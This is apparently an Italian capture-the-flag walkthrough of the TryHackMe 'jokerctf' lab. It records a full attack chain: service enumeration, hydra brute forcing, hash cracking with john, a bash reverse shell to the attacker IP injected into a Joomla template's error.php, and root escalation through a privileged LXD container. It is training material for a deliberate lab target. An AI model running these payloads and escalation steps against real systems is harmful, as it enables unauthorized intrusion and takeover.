
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/jokerctf

Abbiamo sviluppato questo laboratorio per analizzare le pratiche di penetrazione online. Superare questo laboratorio non è poi così difficile se si hanno solide conoscenze di base sui penetration test. Iniziamo e impariamo come violarlo.

1. **Enumerazione dei servizi**  
    _- Nmap  
    
2. **Forza bruta**_- Esecuzione di attacchi Bruteforce su file tramite http_  
    ___- Esecuzione di attacchi Bruteforce sull'autenticazione di base___
3. **Hash Crack**_- Esecuzione di un attacco Bruteforce sull'hash per decifrare il file zip  
    - Esecuzione di un attacco Bruteforce sull'hash per decifrare l'utente MySQL  
    
4. **Sfruttamento**
    - Ottenere una connessione inversa  
    - Generazione di una shell TTY_
5. **Escalation dei privilegi**  
    _: ottieni i privilegi di root sfruttando le falle in LXD_

Enumera i servizi sulla macchina di destinazione.

```
nmap -Pn -vv -O -p- 10.10.207.89
```
```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

```
nmap -sVC -v -p22,80,8080 10.10.207.89
```
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
8080/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

**Che versione di Apache è?**
```
2.4.29
```

**Quale porta su questa macchina non necessita di essere autenticata tramite nome utente e password?**
```
80
```

**Su questa porta c'è un file che sembra essere segreto. Di cosa si tratta?**


```
dirb http://10.10.44.224/ /usr/share/wordlists/dirb/common.txt -X .txt,.php
```

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jun  5 11:17:32 2025
URL_BASE: http://10.10.44.224/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
EXTENSIONS_LIST: (.txt,.php) | (.txt)(.php) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.44.224/ ----
+ http://10.10.44.224/phpinfo.php (CODE:200|SIZE:94846)                                                                                         
+ http://10.10.44.224/secret.txt (CODE:200|SIZE:320)                                                                                            
                                                                                                                                                
-----------------
END_TIME: Thu Jun  5 11:25:37 2025
DOWNLOADED: 9224 - FOUND: 2

```

```
secret.txt
```

**C'è un altro file che rivela informazioni sul backend, di cosa si tratta?**  

```
phpinfo.php
```

**Quando leggiamo il file segreto, ci imbattiamo in una conversazione che sembra contenere almeno due utenti e alcune parole chiave che possono essere interessanti. Quale utente pensi che sia?**  

```
http://10.10.44.224/secret.txt
```
```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

```
joker
```

**Quale porta su questa macchina deve essere autenticata tramite il meccanismo di autenticazione di base?**

```
http://10.10.207.89:8080/
```
abbiamo autenticazione di base
```
8080
```

**A questo punto abbiamo un utente e un URL che deve essere autenticato. Usiamo la forza bruta per ottenere la password. Qual è questa password?**

usiamo hydra per fare brute force

```
hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.183.128 -m / http-get
```

```
└─# hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.183.128 -m / http-get
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-05 11:54:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.183.128:8080/
[8080][http-get] host: 10.10.183.128   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-05 11:55:10

```

ricapitolando abbiamo come user 
```
joker
```
e password
```
hannah
```
per loggarci in http://10.10.100.76:8080

**Sì!! Abbiamo ottenuto utente e password e vediamo un blog basato su CMS. Ora controlla le directory e i file in questa porta. Quale directory appare come directory di amministrazione?**

Utilizziamo Nikto con le credenziali che abbiamo ottenuto

```
nikto -h http://10.10.34.165:8080 -id joker:hannah
```

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.34.165
+ Target Hostname:    10.10.34.165
+ Target Port:        8080
+ Start Time:         2025-06-07 05:45:37 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ /robots.txt: Entry '/tmp/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/language/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/libraries/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cache/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/bin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cli/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/administrator/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/components/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/layouts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/plugins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 14 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /backup.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /web.config: Uncommon header 'tcn' found, with contents: choice.
+ /web.config: ASP config file is accessible.
+ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2047
+ /administrator/: This might be interesting.
+ /bin/: This might be interesting.
+ /includes/: This might be interesting.
+ /tmp/: This might be interesting.
+ /README: README file found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8898 requests: 1 error(s) and 32 item(s) reported on remote host
+ End Time:           2025-06-07 06:01:29 (GMT-4) (952 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

La nostra enumerazione web con Nikto ha rivelato che il sito web contiene un file robots.txt e una directory 
```
/administrator/
```
dove troviamo il pannello di accesso
```
http://10.10.34.165:8080/administrator/
```


**Abbiamo bisogno di accedere all'amministrazione del sito per ottenere una shell. Esiste un file di backup. Che file è questo?**

controllando l'enumerazione eseguita con nikto notiamo un file backup.zip
```
backup.zip
```

**Abbiamo il file di backup e ora dovremmo cercare alcune informazioni, ad esempio il database, i file di configurazione, ecc... Ma il file di backup sembra essere crittografato. Qual è la password?**
lo scarichiamo e proviamo ad aprirlo ma è protetto da password
 utilizziamo john

```
zip2john backup.zip > zip_hash
```

```
john zip_hash
```
trovata la password
```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
hannah           (backup.zip)     
1g 0:00:00:00 DONE 2/3 (2025-06-07 06:24) 4.347g/s 401726p/s 401726c/s 401726C/s 123456..Open
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
password backup.zip
```
hannah
```
**Ricorda che... Abbiamo bisogno di accedere all'amministrazione del sito... Bla bla bla. Nella nostra nuova scoperta vediamo alcuni file che contengono informazioni compromettenti, forse il database? Ok, e se ripristinassimo il database? Alcune tabelle devono avere qualcosa come user_table! Qual è il super-utente?**
```
unzip backup.zip
```
	hannah

```
cd site
```

```
ls
```
troviamo file interessanti come
`configuration.php` (nella cartella site)
che contiene informazioni compromettenti di un db
```
cat configuration.php
```
```
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'joker';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = '1234';
        public $db = 'joomladb';
        public $dbprefix = 'cc1gr_';
        public $live_site = '';
        public $secret = 'hEHSpvGIaMM1yBNd';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '';
        public $ftp_port = '';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'joker@gmail.com';
        public $fromname = 'joker';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = '';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/opt/joomla/administrator/logs';
        public $tmp_path = '/opt/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';

```

ed il file `joomladb.sql` (nella cartella db)

```
cd ..
```

```
cd db
```

```
cat joomladb.sql
```

```
cat joomladb.sql | grep admin
```

```
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
```
dove troviamo un hash password del SuperUser
**Super Duper User! Qual è la password?**
```
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > suser.hash
```

```
john suser.hash /usr/share/wordlists/rockyou.txt --format=bcrypt
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori/db]
└─# echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > suser.hash
                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori/db]
└─# john suser.hash /usr/share/wordlists/rockyou.txt --format=bcrypt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
abcd1234         (?)     
1g 0:00:00:05 DONE 2/3 (2025-06-08 01:28) 0.1838g/s 138.9p/s 138.9c/s 138.9C/s Snoopy..baby
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
ora accediamo a Joombla con le credenziali
```
http://10.10.100.76:8080/administrator/
```
user
```
admin
```
password
```
abcd1234
```

**A questo punto, dovresti caricare una reverse-shell per ottenere l'accesso alla shell. Chi è il proprietario di questa sessione?**
suggerimento:
Forse potresti usare la pagina error.php su un template? Certo, provala ed esegui il comando "id".
quindi andiamo in Editing file "/error.php" in template "beez3"
```
http://10.10.100.76:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D
```
ed editiamo la nostra reverse shell andando a sostituire 
```
<?php echo('Uh Oh 404') ?>
```
con
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");
```
e salviamo.
Sulla nostra macchina attaccante mettiamo in ascolto netcat sulla porta selezionata
```
nc -lvnp 1234
```
 ora ritorniamo su Joombla su Templates: Styles selezioniamo Beez3 come preferito di default su tutte le pagine
  andiamo su 
```
http://10.10.100.76:8080/templates/beez3/error.php
```
ed ==otteniamo la reverse shell!==
```
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.100.76] 40880
bash: cannot set terminal process group (844): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/opt/joomla/templates/beez3$ 

```
facciamo id
```
id
```
```
www-data@ubuntu:/opt/joomla/templates/beez3$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
www-data@ubuntu:/opt/joomla/templates/beez3$ 
```
ed otteniamo la risposta
```
www-data
```
Questo utente appartiene a un gruppo diverso dal tuo. Di che gruppo si tratta?
```
lxd
```
Genera una shell tty.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Per questa domanda dovresti fare una ricerca di base sul funzionamento dei container Linux (LXD). Esiste un piccolo tutorial online. Cerca su Google "LXD, provalo online".  

```
https://www.hackingarticles.in/lxd-privilege-escalation/
```

```
https://github.com/canonical/lxd
```

Cerca come aumentare i privilegi utilizzando le autorizzazioni LXD e controlla se ci sono immagini disponibili sulla casella.  

Per aumentare i privilegi di root della macchina host è necessario creare un'immagine per lxd, quindi è necessario eseguire la seguente azione:
##### **Passaggi da eseguire sulla macchina dell'attaccante** :
- Scarica build-alpine sul tuo computer locale tramite il repository git.
- Eseguire lo script “build -alpine” che creerà l’ultima immagine Alpine come file compresso; questo passaggio deve essere eseguito dall’utente root.
- Trasferisci il file tar sulla macchina host
##### **Passaggi da eseguire sulla macchina host:**
- Scarica l'immagine alpina
- Importa immagine per lxd
- Inizializza l'immagine all'interno di un nuovo contenitore.
- Montare il contenitore all'interno della directory /root

Abbiamo quindi scaricato la build alpine utilizzando il repository GitHub.
```
git clone https://github.com/saghul/lxd-alpine-builder.git
```
```
cd lxd-alpine-builder
```
```
./build-alpine
```

```
ls
```
```
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md  rootfs
```
Eseguendo il comando sopra riportato, viene creato un file tar.gz nella directory di lavoro che trasferiremo sulla macchina vittima
```
python3 -m http.server 8080
```
sulla macchina vittima
```
cd /tmp
```
```
wget http://10.14.99.134:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
```
Dopo aver creato l'immagine, è possibile aggiungerla come immagine a LXD come segue:
```
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```
Utilizzare il comando list per controllare l'elenco delle immagini
```
lxc image list
```
```
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jun 8, 2025 at 6:53am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

```


**L'idea è montare la radice del file system del sistema operativo sul contenitore, in modo da avere accesso alla directory radice.** Creiamo il contenitore con il privilegio true e montiamo il file system radice su /mnt per ottenere accesso alla directory /root sulla macchina host.  

```
lxc init myimage ignite -c security.privileged=true
```
```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```
```
lxc start ignite
```
```
lxc exec ignite /bin/sh
```
```
id
```

```
www-data@ubuntu:/tmp$ lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true
Creating ignite
www-data@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
www-data@ubuntu:/tmp$ lxc start ignite
lxc start ignite
www-data@ubuntu:/tmp$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
~ # ^[[40;5Rid
id
uid=0(root) gid=0(root)
~ # ^[[40;5R

```
Qual è il nome del file nella directory /root?
```
cd /mnt/root/root
```
```
ls
```
```
xxxxxxx.txt
```
```
cat xxxxxxx.txt
```

```

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!

```

 Ben fatto abbiamo ottenuti il nome del file!

